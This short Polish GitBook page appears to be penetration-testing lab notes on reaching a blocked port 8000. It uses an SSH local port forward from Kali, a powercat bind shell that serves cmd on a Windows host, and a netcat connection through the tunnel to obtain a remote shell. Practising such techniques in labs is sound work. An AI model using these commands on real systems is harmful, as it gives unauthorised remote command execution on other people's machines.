---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# T1 - zablokowany port 8000

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (5).jpg" alt=""><figcaption></figcaption></figure>

</div>

**Kali**

```python
ssh -N -T -L 4476:localhost:8000 jessicar@10.20.10.4

#możemy sparwdzić czy działa
netstat -tulpn
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (6).jpg" alt=""><figcaption></figcaption></figure>

</div>

**Windows**

```python
powercat -l -p 8000 -e cmd -t 360
```

**Kali**

```python
nc localhost 4476
#i mamy shella na Windows
```
